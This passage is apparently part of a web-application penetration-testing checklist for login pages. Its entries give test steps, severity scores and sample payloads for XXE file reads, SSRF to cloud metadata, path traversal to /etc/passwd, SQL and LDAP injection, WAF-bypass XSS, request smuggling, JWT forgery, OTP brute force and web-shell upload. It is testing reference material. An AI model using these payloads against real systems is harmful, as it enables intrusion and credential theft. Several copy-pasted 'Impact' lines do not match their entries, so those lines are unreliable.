**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## CLIENT-002 — Sensitive Data in Client-Side Storage
**Test Category:** Client-Side · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. Check localStorage for sensitive data<br>2. Check sessionStorage for sensitive data<br>3. Check cookies for sensitive information<br>4. Check IndexedDB for stored data<br>5. Check Web SQL / Cache Storage<br>6. Look for tokens credentials or PII in client storage

**Expected Result:** No sensitive information (credentials tokens PII) should be stored in client-side storage mechanisms

**Payload Example:**

```
Browser Console:
console.log(localStorage)
console.log(sessionStorage)
document.cookie

Check for stored:
- Passwords
- API keys
- Session tokens
- Personal information
```

**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## CLIENT-003 — Subresource Integrity Check
**Test Category:** Client-Side · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. Check if external scripts have integrity attributes<br>2. Test if SRI is bypassed by modifying script<br>3. Check for CDN poisoning via SRI bypass

**Expected Result:** External scripts should use SRI to prevent tampering

**Payload Example:**

```
<script src="https://cdn.com/script.js" integrity="sha384-..." crossorigin="anonymous"></script>
Test without integrity attribute
```

**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## CLIENT-006 — Hidden Form Fields Analysis
**Test Category:** Client-Side · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. View page source and identify all hidden input fields<br>2. Check hidden field values for sensitive information<br>3. Test modifying hidden field values<br>4. Look for debug or admin related hidden fields<br>5. Check if hidden fields influence authentication logic

**Expected Result:** Hidden form fields should not contain sensitive information or be relied upon for security decisions

**Payload Example:**

```
<input type="hidden" name="role" value="user">
Change to: value="admin"

<input type="hidden" name="debug" value="false">
Change to: value="true"

<input type="hidden" name="redirect" value="/dashboard">
Test for open redirect
```

**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## CLIENT-005 — Mixed Content Testing
**Test Category:** Client-Side · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Reflected/stored/DOM input rendered in a page

**Test Steps:** 1. Check for HTTP resources on HTTPS pages<br>2. Test if mixed content is blocked<br>3. Check for insecure form actions<br>4. Test passive vs active mixed content

**Expected Result:** HTTPS pages should not load HTTP resources

**Payload Example:**

```
Check browser console for mixed content warnings
<form action="http://..."> on HTTPS page
```

**Impact:** Script executes in victim context -&gt; session/token theft

**Tools:** Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS (Gareth Heyes); PayloadsAllTheThings

---

## API-002 — API Authentication Bypass
**Test Category:** API Testing · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API endpoint (REST/GraphQL) — auth/authz

**Test Steps:** 1. Test API without authentication<br>2. Test with invalid tokens<br>3. Test token in wrong header<br>4. Test expired tokens<br>5. Check for IDOR in API

**Expected Result:** API should require proper authentication

**Payload Example:**

```
GET /api/user/123 without auth
Authorization: Bearer invalid_token
```

**Impact:** API authz/authn flaw -&gt; data access or priv-esc

**Tools:** Burp Suite / Postman

**References:** CWE-284; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10; -&gt;[API master checklist](#/checklist/api)

---

## API-001 — API Endpoint Discovery
**Test Category:** API Testing · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API endpoint (REST/GraphQL) — auth/authz

**Test Steps:** 1. Check for /api/ /v1/ /v2/ paths<br>2. Test common API endpoints<br>3. Check for API documentation exposure<br>4. Test parameter enumeration<br>5. Check for undocumented endpoints

**Expected Result:** API endpoints should not be exposed without authentication

**Payload Example:**

```
GET /api/users
GET /api/admin
Check for /swagger /api-docs
```

**Impact:** API authz/authn flaw -&gt; data access or priv-esc

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-284; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10; -&gt;[API master checklist](#/checklist/api)

---

## API-003 — API Rate Limiting Testing
**Test Category:** API Testing · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** API endpoint (REST/GraphQL) — auth/authz

**Test Steps:** 1. Send rapid API requests<br>2. Test rate limit bypass techniques<br>3. Check rate limit headers<br>4. Test different user agents<br>5. Test IP rotation

**Expected Result:** API should implement rate limiting

**Payload Example:**

```
Send 100 requests/minute
Check X-Rate-Limit headers
```

**Impact:** API authz/authn flaw -&gt; data access or priv-esc

**Tools:** Burp Suite / Custom Script

**References:** CWE-284; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP API Security Top 10; -&gt;[API master checklist](#/checklist/api)

---

## UPLOAD-001 — File Upload Security Testing
**Test Category:** File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File-upload multipart field (name/content/type)

**Test Steps:** 1. Check if login allows file uploads (avatar etc.)<br>2. Test unrestricted file upload<br>3. Test file type bypass (.php.jpg)<br>4. Test content validation<br>5. Check for path traversal

**Expected Result:** File uploads should be restricted and validated

**Payload Example:**

```
Upload shell.php as avatar
Upload with double extension
```

**Impact:** Malicious upload -&gt; webshell/RCE or stored XSS

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger file upload; OWASP Upload Cheat Sheet

---

## UPLOAD-002 — Image Upload Vulnerabilities
**Test Category:** File Upload · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** File-upload multipart field (name/content/type)

**Test Steps:** 1. Upload malicious images (polyglot)<br>2. Test EXIF data injection<br>3. Check for image processing vulnerabilities<br>4. Test SVG uploads for XSS<br>5. Check for SSRF in image URLs

**Expected Result:** Image uploads should be sanitized

**Payload Example:**

```
Upload SVG with <script>
Upload image with EXIF XSS
```

**Impact:** Malicious upload -&gt; webshell/RCE or stored XSS

**Tools:** Burp Suite / ExifTool

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger file upload; OWASP Upload Cheat Sheet

---

## SSRF-001 — SSRF via Image URL Upload
**Test Category:** SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** URL/host params (fetch/webhook/import/image)

**Test Steps:** 1. If image upload from URL exists<br>2. Test internal URLs<br>3. Test cloud metadata<br>4. Test localhost access<br>5. Check for SSRF filters

**Expected Result:** URL-based uploads should validate and restrict URLs

**Payload Example:**

```
Upload from URL: http://169.254.169.254/latest/meta-data/
http://127.0.0.1:22
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger SSRF

---

## SSRF-002 — SSRF via Webhook Configuration
**Test Category:** SSRF · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** URL/host params (fetch/webhook/import/image)

**Test Steps:** 1. Check for webhook setup in profile<br>2. Test webhook to internal URLs<br>3. Test SSRF bypass techniques<br>4. Check for blind SSRF<br>5. Test protocol handlers

**Expected Result:** Webhooks should validate URLs

**Payload Example:**

```
Set webhook to http://internal-server/admin
Use gopher:// for advanced SSRF
```

**Impact:** Internal service access, cloud-metadata theft, potential RCE

**Tools:** Burp Suite / Custom Script

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger SSRF

---

## XXE-001 — XXE in XML API
**Test Category:** XXE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** XML request body / uploaded XML

**Test Steps:** 1. Check if API accepts XML<br>2. Test XXE payloads<br>3. Test blind XXE<br>4. Check for XXE in SAML/OAuth<br>5. Test external entity loading

**Expected Result:** XML parsing should disable external entities

**Payload Example:**

```
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user>&xxe;</user>
```

**Impact:** XXE -&gt; file read / SSRF / OOB exfiltration

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE; OWASP XXE Prevention

---

## ORM-001 — ORM Injection Testing
**Test Category:** ORM Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ORM-backed filter/sort/query params

**Test Steps:** 1. Identify ORM framework used<br>2. Test framework-specific injection payloads<br>3. Test for raw SQL execution bypass<br>4. Check parameterized query usage<br>5. Test mass assignment

**Expected Result:** ORM queries should be safe from injection

**Payload Example:**

```
Django: ' OR '1'='1
SQLAlchemy: ' UNION SELECT 1 --
ActiveRecord: ' OR 1=1 --
```

**Impact:** ORM injection -&gt; query manipulation, data disclosure/bypass

**Tools:** Burp Suite / Custom Script

**References:** CWE-89; -&gt;[ORM Injection checklist](#/checklist/orm); PortSwigger SQLi; framework advisories; -&gt;orm.csv

---

## SSTI-001 — SSTI in Template Engines
**Test Category:** SSTI · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Template-rendered input fields

**Test Steps:** 1. Identify template engine<br>2. Test engine-specific payloads<br>3. Check for code execution<br>4. Test blind SSTI<br>5. Check template injection in emails

**Expected Result:** Templates should not execute user input

**Payload Example:**

```
Jinja2: {{7*7}}
Freemarker: ${7*7}
Handlebars: {{constructor.constructor('alert(1)')()}}
```

**Impact:** Template injection escalating to RCE

**Tools:** Burp Suite / tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); James Kettle SSTI (PortSwigger Research)

---

## LDAP-001 — LDAP Injection Advanced
**Test Category:** LDAP Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Auth/search fields reaching an LDAP filter

**Test Steps:** 1. Test LDAP search filters<br>2. Test DN injection<br>3. Check for blind LDAP<br>4. Test LDAP attribute injection<br>5. Check for LDAP password spraying

**Expected Result:** LDAP queries should be parameterized

**Payload Example:**

```
(&(uid=*)(userPassword=*)
(uid=admin)(|(userPassword=*))
```

**Impact:** LDAP filter injection -&gt; authN bypass &amp; directory disclosure

**Tools:** Burp Suite / Custom Script

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## ERR-003 — Stack Trace Disclosure
**Test Category:** Error Handling · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / headers

**Test Steps:** 1. Trigger application errors<br>2. Check for stack traces in responses<br>3. Test with malformed requests<br>4. Check error logs exposure<br>5. Test debug mode stack traces

**Expected Result:** No stack traces should be exposed in production

**Payload Example:**

```
Trigger 500 error and check for Java/.NET stack traces
```

**Impact:** Stack traces/paths/PII leaked, aiding further exploitation

**Tools:** Burp Suite

**References:** CWE-209; -&gt;[Recon checklist](#/checklist/recon); OWASP WSTG-ERRH; PortSwigger information disclosure

---

## ERR-001 — Verbose Error Message Analysis
**Test Category:** Error Handling · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / headers

**Test Steps:** 1. Submit malformed data to trigger errors<br>2. Submit special characters to cause application errors<br>3. Test with empty required fields<br>4. Test with oversized input<br>5. Test with wrong data types<br>6. Analyze all error messages for information disclosure<br>7. Look for stack traces file paths database errors framework details

**Expected Result:** Error messages should be generic and not reveal internal details. No stack traces file paths database names or technical details should be exposed

**Payload Example:**

```
Submit: username=<>&password='
Submit: username=null&password=undefined
Submit: username[]=array&password[]=array
Submit empty request body

VULNERABLE error:
'java.sql.SQLException: Column 'username' not found in table 'users' at com.app.LoginServlet.doPost(LoginServlet.java:45)'

SECURE error:
'Invalid credentials. Please try again.'
```

**Impact:** Stack traces/paths/PII leaked, aiding further exploitation

**Tools:** Burp Suite / Browser

**References:** CWE-209; -&gt;[Recon checklist](#/checklist/recon); OWASP WSTG-ERRH; PortSwigger information disclosure

---

## ERR-002 — Custom Error Page Testing
**Test Category:** Error Handling · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / headers

**Test Steps:** 1. Request non-existent pages to trigger 404<br>2. Trigger 500 errors with malformed requests<br>3. Trigger 400 errors with invalid parameters<br>4. Trigger 413 errors with large payloads<br>5. Check if custom error pages are implemented for all error codes<br>6. Verify error pages don't leak server information

**Expected Result:** Custom error pages should be implemented for all HTTP error codes revealing no technical information

**Payload Example:**

```
GET /thispagedoesnotexist HTTP/1.1
GET /login%00 HTTP/1.1
GET /login?id=999999999999999999 HTTP/1.1

Check if default Apache/Nginx/IIS/Tomcat error pages are shown
```

**Impact:** Stack traces/paths/PII leaked, aiding further exploitation

**Tools:** Burp Suite / Browser / curl

**References:** CWE-209; -&gt;[Recon checklist](#/checklist/recon); OWASP WSTG-ERRH; PortSwigger information disclosure

---

## ERR-004 — Information Disclosure via Headers
**Test Category:** Error Handling · **Severity:** Low · **CVSS:** 3.1 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Error responses / verbose output / headers

**Test Steps:** 1. Check response headers for sensitive info<br>2. Test X-Powered-By X-AspNet-Version<br>3. Check Server header details<br>4. Test for internal IP disclosure

**Expected Result:** Headers should not disclose sensitive information

**Payload Example:**

```
Server: Apache/2.4.49 (detailed version)
X-Powered-By: PHP/7.4.3
```

**Impact:** Stack traces/paths/PII leaked, aiding further exploitation

**Tools:** Burp Suite

**References:** CWE-209; -&gt;[Recon checklist](#/checklist/recon); OWASP WSTG-ERRH; PortSwigger information disclosure

---

## CRYPTO-001 — Weak Password Hashing Detection
**Test Category:** Cryptography · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Check server response for any hash-related information<br>2. If any hashes are exposed check the algorithm<br>3. Test if password is sent in plaintext in request<br>4. Check if password is Base64 encoded (not encryption)<br>5. Monitor network traffic for credential exposure

**Expected Result:** Passwords should be transmitted securely and server should use strong hashing (bcrypt scrypt Argon2)

**Payload Example:**

```
Check request body:
password=plaintext (OK for HTTPS)
password=cGFzc3dvcmQ= (Base64 - NOT encryption - VULNERABLE)
password=5f4dcc3b5aa765d61d8327deb882cf99 (MD5 hash client-side - WEAK)

All transmission must be over HTTPS
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** Burp Suite / Wireshark

**References:** CWE-327; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-CRYP; testssl.sh

---

## CRYPTO-002 — Insecure Token Generation
**Test Category:** Cryptography · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Collect multiple tokens/cookies from login page<br>2. Analyze tokens for predictable patterns<br>3. Check if tokens are based on timestamp<br>4. Check if tokens are sequential<br>5. Attempt to decode tokens (Base64 hex)<br>6. Check JWT tokens for algorithm none attack

**Expected Result:** All security tokens should be cryptographically random and unpredictable. JWT should not accept none algorithm

**Payload Example:**

```
Sequential tokens: token=1001 token=1002 (VULNERABLE)
Timestamp-based: token=1634567890 (VULNERABLE)
Base64 encoded data: token=YWRtaW4= (admin - VULNERABLE)

JWT none attack:
Change algorithm to none and remove signature
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** Burp Suite Sequencer / jwt_tool / CyberChef

**References:** CWE-327; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-CRYP; testssl.sh

---

## CRYPTO-003 — Weak Encryption Algorithms
**Test Category:** Cryptography · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Check if data is encrypted<br>2. Test for DES/3DES/MD5 usage<br>3. Check for ECB mode<br>4. Test padding oracle attacks<br>5. Check for known weak keys

**Expected Result:** Only strong encryption algorithms should be used

**Payload Example:**

```
Test for ECB mode by encrypting identical blocks
Check for padding oracle: modify ciphertext and observe errors
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** Burp Suite / PadBuster

**References:** CWE-327; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-CRYP; testssl.sh

---

## CRYPTO-004 — Insecure Random Number Generation
**Test Category:** Cryptography · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** TLS config / at-rest &amp; in-transit crypto

**Test Steps:** 1. Test for predictable random values<br>2. Check session tokens for patterns<br>3. Test Math.random() usage in JS<br>4. Check for weak PRNG in server-side code

**Expected Result:** Random values should use cryptographically secure generators

**Payload Example:**

```
Check if session tokens are predictable
Test JS: Math.random() for randomness
```

**Impact:** Weak crypto/TLS exposes data in transit or at rest

**Tools:** Burp Suite / Custom Script

**References:** CWE-327; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-CRYP; testssl.sh

---

## WAF-002 — WAF Rule Bypass Techniques
**Test Category:** WAF/Firewall · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** WAF/filter in front of the app

**Test Steps:** 1. Identify WAF type (ModSecurity Cloudflare etc.)<br>2. Test known bypasses for that WAF<br>3. Test case variations<br>4. Test encoding bypasses<br>5. Test fragmentation attacks

**Expected Result:** WAF rules should not be easily bypassed

**Payload Example:**

```
For ModSecurity:
<scr<script>ipt>alert(1)</scr</script>ipt>
Or fragmentation: <script>alert(1)</script> split across packets
```

**Impact:** WAF/filter bypass delivering blocked payloads to sinks

**Tools:** Burp Suite / WAF Bypass Lists

**References:** CWE-693; -&gt;[WAF / Filter Bypass checklist](#/checklist/wafbypass); PayloadsAllTheThings WAF evasion; -&gt;waf_filter_bypass.csv

---

## WAF-001 — WAF Detection and Bypass
**Test Category:** WAF/Firewall · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** WAF/filter in front of the app

**Test Steps:** 1. Send known malicious payloads to detect WAF<br>2. Identify WAF vendor from block page or headers<br>3. Test WAF bypass techniques: encoding obfuscation case variation<br>4. Test with chunked transfer encoding<br>5. Test with HTTP/2 specific bypass<br>6. Test with content-type switching

**Expected Result:** If WAF is present test if it can be bypassed. Document WAF type and effectiveness

**Payload Example:**

```
Detect WAF:
<script>alert(1)</script>
' OR 1=1 --

Bypass techniques:
<scr<script>ipt>alert(1)</scr</script>ipt>
SELECT/**/1/**/FROM/**/users
uni%6Fn sel%65ct
Transfer-Encoding: chunked
```

**Impact:** WAF/filter bypass delivering blocked payloads to sinks

**Tools:** wafw00f / Burp Suite / Custom Payloads

**References:** CWE-693; -&gt;[WAF / Filter Bypass checklist](#/checklist/wafbypass); PayloadsAllTheThings WAF evasion; -&gt;waf_filter_bypass.csv

---

## WAF-003 — WAF Fingerprinting
**Test Category:** WAF/Firewall · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** WAF/filter in front of the app

**Test Steps:** 1. Send malicious requests to trigger WAF<br>2. Analyze WAF responses and headers<br>3. Identify WAF vendor from signatures<br>4. Test WAF version detection<br>5. Check for WAF bypass opportunities

**Expected Result:** WAF presence should not be easily detectable or bypassable

**Payload Example:**

```
Send: <script>alert(1)</script>
Check response: Cloudflare block page or ModSecurity error
```

**Impact:** WAF/filter bypass delivering blocked payloads to sinks

**Tools:** wafw00f / Burp Suite

**References:** CWE-693; -&gt;[WAF / Filter Bypass checklist](#/checklist/wafbypass); PayloadsAllTheThings WAF evasion; -&gt;waf_filter_bypass.csv

---

## MISC-007 — Path Traversal on Login Endpoint
**Test Category:** Miscellaneous · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** File-path parameter (../ traversal)

**Test Steps:** 1. Test path traversal in URL: /login/../../../etc/passwd<br>2. Test encoded traversal: /login/..%2f..%2f..%2fetc%2fpasswd<br>3. Test double encoding: /login/..%252f..%252f<br>4. Test with null bytes: /login/../../../etc/passwd%00.html<br>5. Test in parameters: ?file=../../../etc/passwd

**Expected Result:** Application should not be vulnerable to path traversal. Directory traversal sequences should be blocked

**Payload Example:**

```
GET /login/../../../etc/passwd HTTP/1.1
GET /login/..%2f..%2f..%2fetc/passwd HTTP/1.1
GET /login/....//....//....//etc/passwd HTTP/1.1
GET /login?page=../../../etc/passwd HTTP/1.1
GET /login?template=../../../etc/passwd%00 HTTP/1.1
```

**Impact:** Arbitrary file read/write outside intended dir

**Tools:** Burp Suite / dotdotpwn / Custom Script

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); Orange Tsai path-confusion; PortSwigger

---

## MISC-008 — HTTP Request Smuggling
**Test Category:** Miscellaneous · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Front-end/back-end request boundary (CL/TE)

**Test Steps:** 1. Test for CL.TE (Content-Length vs Transfer-Encoding) smuggling<br>2. Test for TE.CL smuggling<br>3. Test for TE.TE with header obfuscation<br>4. Check if front-end and back-end handle headers differently<br>5. Monitor for unusual responses or timeout differences

**Expected Result:** Server should consistently handle Content-Length and Transfer-Encoding headers preventing request smuggling

**Payload Example:**

```
CL.TE:
POST /login HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

TE.CL:
POST /login HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

**Impact:** HTTP desync -&gt; request hijacking &amp; cache poisoning

**Tools:** Burp Suite HTTP Request Smuggler Extension / Custom Script

**References:** CWE-444; -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP Desync (PortSwigger Research)

---

## MISC-011 — JWT Token Testing (if applicable)
**Test Category:** Miscellaneous · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Authorization: Bearer JWT (header/payload/sig)

**Test Steps:** 1. Check if JWT tokens are used (in cookies or headers)<br>2. Decode JWT and analyze header and payload<br>3. Test 'none' algorithm attack<br>4. Test algorithm confusion (RS256 to HS256)<br>5. Test weak secret key brute force<br>6. Check token expiration claims<br>7. Test modifying payload claims

**Expected Result:** JWT should use strong algorithms with proper key management. None algorithm should be rejected. Tokens should have expiration

**Payload Example:**

```
Decode JWT: jwt.io

None algorithm:
{"alg":"none"}.{"user":"admin"}.

Algorithm confusion:
Change RS256 to HS256 and sign with public key

Weak key:
hashcat -m 16500 jwt.txt wordlist.txt
```

**Impact:** JWT forgery/confusion -&gt; authN bypass &amp; privilege escalation

**Tools:** jwt_tool / hashcat / Burp Suite / jwt.io

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT; PortSwigger JWT; RFC 8725

---

## MISC-014 — 2FA/OTP Bypass Testing
**Test Category:** Miscellaneous · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** 2FA/OTP verification endpoint

**Test Steps:** 1. If 2FA/OTP is visible on login page test bypass<br>2. Try directly accessing authenticated pages after first factor<br>3. Test OTP brute force (4-6 digit codes)<br>4. Test if OTP can be reused<br>5. Test null or empty OTP submission<br>6. Test OTP expiration time<br>7. Check if OTP is returned in response

**Expected Result:** 2FA/OTP should not be bypassable. OTP should be rate-limited time-limited single-use and validated server-side

**Payload Example:**

```
Direct access: GET /dashboard (after username/password before OTP)
Brute force: otp=0000 to otp=9999
Empty OTP: otp= or remove otp parameter
Response check: Look for OTP in JSON response or headers
Reuse: Submit same valid OTP twice
```

**Impact:** 2FA/MFA bypass defeats the second factor -&gt; ATO

**Tools:** Burp Suite Intruder / Custom Script

**References:** CWE-287; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger 2FA bypass; OWASP WSTG-ATHN

---

## MISC-005 — Login Page Over Different Protocols
**Test Category:** Miscellaneous · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Access login page via HTTP vs HTTPS<br>2. Check for protocol downgrade attacks<br>3. Test if cookies set over HTTPS are transmitted over HTTP<br>4. Check for mixed content issues<br>5. Test HSTS bypass techniques

**Expected Result:** Login page should only be accessible via HTTPS. HTTP should redirect. No mixed content should exist

**Payload Example:**

```
http://target.com/login -> should redirect to HTTPS
Check for mixed content in browser console
Test cookie transmission:
Set cookie over HTTPS then request HTTP and check if cookie is sent
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Browser / Burp Suite / curl / SSLStrip

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## MISC-006 — Subdirectory Access Control Testing
**Test Category:** Miscellaneous · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. For each discovered directory test access without authentication<br>2. Test common authenticated paths: /dashboard /profile /admin /settings /api<br>3. Test with various HTTP methods on protected paths<br>4. Check for inconsistent access controls<br>5. Test path traversal: /login/../admin /login/..;/admin

**Expected Result:** All authenticated paths should return 401/403 or redirect to login when accessed without valid session

**Payload Example:**

```
GET /dashboard HTTP/1.1 (no cookie)
GET /admin HTTP/1.1 (no cookie)
GET /api/users HTTP/1.1 (no cookie)
GET /settings HTTP/1.1 (no cookie)
GET /profile HTTP/1.1 (no cookie)
GET /login/../admin HTTP/1.1
GET /login/..;/admin HTTP/1.1
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Burp Suite / Dirsearch / ffuf

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## MISC-016 — Third-Party Integration Security
**Test Category:** Miscellaneous · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Server config / response headers / defaults

**Test Steps:** 1. Check for third-party login (Google Facebook etc.)<br>2. Test OAuth misconfigurations<br>3. Check for API key exposure in client-side code<br>4. Test redirect URI validation<br>5. Check for token leakage

**Expected Result:** Third-party integrations should be securely configured

**Payload Example:**

```
Check client-side for API keys
Test invalid redirect_uri
```

**Impact:** Misconfiguration exposes data or weakens controls

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-16; -&gt;[CORS checklist](#/checklist/cors); OWASP WSTG-CONF; PortSwigger

---

## MISC-013 — API Endpoint Discovery Behind Login
